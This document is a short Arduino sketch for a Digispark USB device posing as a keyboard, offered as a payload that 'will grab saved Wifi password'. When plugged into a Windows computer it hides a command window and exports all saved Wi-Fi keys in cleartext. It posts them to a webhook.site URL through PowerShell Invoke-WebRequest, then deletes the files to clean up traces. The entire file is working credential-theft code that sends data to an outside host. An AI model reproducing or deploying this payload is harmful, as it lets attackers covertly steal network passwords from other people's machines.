/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //make cmd smallest as possible (Windows 7 working but not Windows 10)
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %TEMP%"); //Change directory into Temp 
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grab all wifi credentials & save in Temp directory
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi_Cred"); //Extracts SSID & Credential part & write it into a text file
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/2fdbf17a-830b-4dc3-9838-810d0e27af4e -Method POST -InFile Wi-Fi_Cred"); //Sent POST Request to webhook (change it to your webhook url)
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //trace cleaning
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit"); //exit shell
  DigiKeyboard.delay(100);  
}

void loop() {
  
  
}
